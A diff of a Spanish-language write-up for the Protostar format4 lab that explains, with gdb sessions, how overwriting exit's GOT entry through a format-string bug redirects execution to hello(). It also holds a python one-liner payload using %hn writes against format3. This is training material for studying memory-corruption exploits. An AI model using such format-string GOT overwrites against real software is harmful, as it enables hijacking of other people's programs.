@@ -323,9 +323,9 @@ AAAA
 AAAA
 Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
 (gdb) x/i 0x80483ec       -> Nos interesa ver la primera instruccion de plt (la que tiene relacion con la GOT, no las del ld.so)
-0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724 -> Llamada buscar la direccion de la tabla GOT
+0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724 -> Llamada a buscar la dirección en la tabla GOT
 (gdb) x 0x8049724
-0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0 
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0 -> Insutruccion original.
 (gdb) set {int}0x8049724=0x080484b4 -> en esta memoria que es donde se mete la direccion de la funcion a jeecutar, metemos la de hello.
 (gdb) c
 Continuing.
@@ -347,7 +347,13 @@ Vamos a explotarla de una manera muy similar a format3, pero en vez de sobreescr
 (gdb) break * 0x08048503 -> Antes de que modifique el GOT por meter los comandos de la pila 
 (gdb) run
 (gdb) x/i 0x80483ec
-0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724  -> Saltamos a la GOT...
+0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724  
+```
+0x8049724 es la dirección donde la función ld.so iría a escribir dirección de exit() (por tanto estamos ante un trozo de la tabla GOT)
+El objetivo sería que en vez de que escriba el ld.so escribamos nosotros (y al ya no estar ya vacía no lo llame)
+> TROZO DE TABLA GOT "0x8049724": \[modo normal]->  nada -> ld.so -> dir_exit()           \[exploit]-> dir_hello()
+
+```console
 (gdb) x/x 0x8049724 -> Insutruciion de GOT, alberga la direccion de nuestra funcion (o sea es un puntero de funcion)
 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2 
 (gdb) x/2i 0x080483f2 -> No se ha ejecutado todavia, por eso salen las insutrcciones que llaman al ld.so.
@@ -355,8 +361,7 @@ Vamos a explotarla de una manera muy similar a format3, pero en vez de sobreescr
 0x80483f7 <exit@plt+11>:	jmp    0x804837c
 ```
 
-Por tanto la memoria 0x8049724 tiene que tener la direccion de hello() 
-
+Por tanto con format srings meteremos en  "0x8049724" la direccion de hello() 
 Vamos a calcular el offset primero
 
 ```console
@@ -407,7 +412,7 @@ $19 = 33616 -> Esto es para el segundo argumento (el primero se queda como antes
 code execution redirected! you win
 ```
 
-## Extra -> Probe a hacer la tecnica de los 2 bytes con el format 3 (tiene que salir 0x1025544)
+## Extra -> Probé a hacer la tecnica de los 2 bytes con el format 3 (tiene que salir 0x1025544)
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn%13$hn"' | ./format3 | tail -n1
